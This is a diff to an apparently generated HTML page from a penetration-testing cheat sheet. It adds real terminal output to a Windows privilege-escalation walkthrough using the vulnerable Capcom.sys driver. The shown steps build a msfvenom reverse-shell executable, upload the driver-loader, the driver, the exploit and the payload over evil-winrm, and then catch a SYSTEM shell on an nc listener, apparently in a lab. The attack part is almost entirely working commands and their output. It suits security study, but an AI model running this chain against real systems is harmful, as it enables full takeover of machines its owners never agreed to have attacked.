@@ -341,7 +341,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 <h4 id="3-compile-exploitcapcom">3. Compile ExploitCapcom</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">+----------------------------------------------------------------------------------------+
 </span></span></span><span class="line"><span class="cl"><span class="go">| 1. Double click ExploitCapcom.sln                                                      |
-</span></span></span><span class="line"><span class="cl"><span class="go">| 2. Replace the payload to `TCHAR CommandLine[] = TEXT(&#34;C:\\Windows\\Tasks\\rev.exe&#34;);` |
+</span></span></span><span class="line"><span class="cl"><span class="go">| 2. Replace the payload to `TCHAR CommandLine[] = TEXT(&#34;C:\\ProgramData\\rev.exe&#34;);` |
 </span></span></span><span class="line"><span class="cl"><span class="go">| 3. Release -&gt; x64                                                                      |
 </span></span></span><span class="line"><span class="cl"><span class="go">| 4. Build   -&gt; Build Solution                                                           |
 </span></span></span><span class="line"><span class="cl"><span class="go">| 5. Exported to .\x64\Release\ExploitCapcom.exe                                         |
@@ -349,17 +349,74 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/tandasat/ExploitCapcom/tree/master/ExploitCapcom">ExploitCapcom</a></em></small></p>
 <h4 id="3-create-stageless-payload">3. Create stageless payload</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;LOCAL_IP&gt; LPORT=&lt;LOCAL_PORT&gt; -f exe -o rev.exe
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.31 <span class="nv">LPORT</span><span class="o">=</span><span class="m">1337</span> -f exe -o rev.exe
+</span></span><span class="line"><span class="cl"><span class="go">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span></span></span><span class="line"><span class="cl"><span class="go">[-] No arch selected, selecting arch: x64 from the payload
+</span></span></span><span class="line"><span class="cl"><span class="go">No encoder specified, outputting raw payload
+</span></span></span><span class="line"><span class="cl"><span class="go">Payload size: 460 bytes
+</span></span></span><span class="line"><span class="cl"><span class="go">Final size of exe file: 7168 bytes
+</span></span></span><span class="line"><span class="cl"><span class="go">Saved as: rev.exe
 </span></span></span></code></pre></div><h4 id="4-upload">4. Upload</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> For example <span class="o">(</span>evil-winrm<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="go">upload Eoploaddriver.exe C:\ProgramData\Eoploaddriver.exe
+</span></span><span class="line"><span class="cl"><span class="go">upload EoPLoadDriver.exe C:\ProgramData\EoPLoadDriver.exe
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\programdata&gt; upload EoPLoadDriver.exe C:\ProgramData\EoPLoadDriver.exe
+</span></span></span><span class="line"><span class="cl"><span class="go">                                        
+</span></span></span><span class="line"><span class="cl"><span class="go">Info: Uploading /home/kali/EoPLoadDriver.exe to C:\ProgramData\EoPLoadDriver.exe
+</span></span></span><span class="line"><span class="cl"><span class="go">                                        
+</span></span></span><span class="line"><span class="cl"><span class="go">Data: 20480 bytes of 20480 bytes copied
+</span></span></span><span class="line"><span class="cl"><span class="go">                                        
+</span></span></span><span class="line"><span class="cl"><span class="go">Info: Upload successful!
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">upload Capcom.sys C:\ProgramData\Capcom.sys
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\programdata&gt; upload Capcom.sys C:\ProgramData\Capcom.sys
+</span></span></span><span class="line"><span class="cl"><span class="go">                                        
+</span></span></span><span class="line"><span class="cl"><span class="go">Info: Uploading /home/kali/Capcom.sys to C:\ProgramData\Capcom.sys
+</span></span></span><span class="line"><span class="cl"><span class="go">                                        
+</span></span></span><span class="line"><span class="cl"><span class="go">Data: 14100 bytes of 14100 bytes copied
+</span></span></span><span class="line"><span class="cl"><span class="go">                                        
+</span></span></span><span class="line"><span class="cl"><span class="go">Info: Upload successful!
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">upload ExploitCapcom.exe C:\ProgramData\ExploitCapcom.exe
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\programdata&gt; upload ExploitCapcom.exe
+</span></span></span><span class="line"><span class="cl"><span class="go">                                        
+</span></span></span><span class="line"><span class="cl"><span class="go">Info: Uploading /home/kali/ExploitCapcom.exe to C:\programdata\ExploitCapcom.exe
+</span></span></span><span class="line"><span class="cl"><span class="go">                                        
+</span></span></span><span class="line"><span class="cl"><span class="go">Data: 335188 bytes of 335188 bytes copied
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">upload rev.exe C:\ProgramData\rev.exe
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\programdata&gt; upload rev.exe C:\ProgramData\rev.exe
+</span></span></span><span class="line"><span class="cl"><span class="go">                                        
+</span></span></span><span class="line"><span class="cl"><span class="go">Info: Uploading /home/kali/rev.exe to C:\ProgramData\rev.exe
+</span></span></span><span class="line"><span class="cl"><span class="go">                                        
+</span></span></span><span class="line"><span class="cl"><span class="go">Data: 9556 bytes of 9556 bytes copied
+</span></span></span><span class="line"><span class="cl"><span class="go">                                        
+</span></span></span><span class="line"><span class="cl"><span class="go">Info: Upload successful!
 </span></span></span></code></pre></div><h4 id="5-exploit">5. Exploit</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Start a nc listener
 </span></span><span class="line"><span class="cl"><span class="go">rlwrap nc -lvnp &lt;LOCAL_PORT&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> rlwrap nc -lvnp <span class="m">1337</span>                                                                                                    
+</span></span><span class="line"><span class="cl"><span class="go">listening on [any] 1337 ...
+</span></span></span><span class="line"><span class="cl"><span class="go">connect to [10.10.14.31] from (UNKNOWN) [10.10.10.193] 49855
+</span></span></span><span class="line"><span class="cl"><span class="go">Microsoft Windows [Version 10.0.14393]
+</span></span></span><span class="line"><span class="cl"><span class="go">(c) 2016 Microsoft Corporation. All rights reserved.
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">C:\programdata&gt;whoami
+</span></span></span><span class="line"><span class="cl"><span class="go">whoami
+</span></span></span><span class="line"><span class="cl"><span class="go">nt authority\system
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">C:\ProgramData\Eoploaddriver.exe System\CurrentControlSet\test C:\ProgramData\Capcom.sys
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\programdata&gt; C:\ProgramData\ExploitCapcom.exe
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Capcom.sys exploit
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Capcom.sys handle was obtained as 0000000000000064
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Shellcode was placed at 000001937C0C0008
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Shellcode was executed
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Token stealing was successful
+</span></span></span><span class="line"><span class="cl"><span class="go">[-] CreateProcess() failed
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">C:\ProgramData\ExploitCapcom.exe
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\programdata&gt; C:\ProgramData\ExploitCapcom.exe
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Capcom.sys exploit
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Capcom.sys handle was obtained as 0000000000000064
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Shellcode was placed at 00000221D2140008
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Shellcode was executed
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Token stealing was successful
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] The SYSTEM shell was launched
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Press any key to exit this program
 </span></span></span></code></pre></div>
 </div></div>
     
